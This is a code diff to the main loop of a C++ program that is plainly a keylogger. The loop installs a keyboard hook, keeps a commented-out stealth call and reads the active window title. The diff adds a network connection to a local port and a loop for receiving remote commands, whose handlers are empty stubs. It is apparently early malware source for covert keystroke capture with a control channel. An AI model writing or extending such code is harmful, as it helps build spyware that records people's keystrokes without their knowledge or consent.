@@ -38,15 +38,30 @@ int	Core::run()
 {
 	bool Continue = true;
 	//BOOL bRet;
+	bool connected;
+	std::queue<std::string> queue;
 
 	if (keylog.installhook() == false)
 		Continue = false;
 	//keylog.stealth();
 
 	std::cout << keylog.GetActiveWindowTitle() << std::endl;
+	connected = net.connect("127.0.0.1", 4242);
 	while (Continue)
 	{
 		keylog.peekMsg();
+		net.receive();
+		queue = net.getQueue();
+		if (queue.size() > 0) {
+			if (queue.front() == "") {
+
+			} else if (queue.front() == "") {
+			
+			} else {
+			
+			}
+			queue.pop();
+		}
 	}
 	return (0);
 }
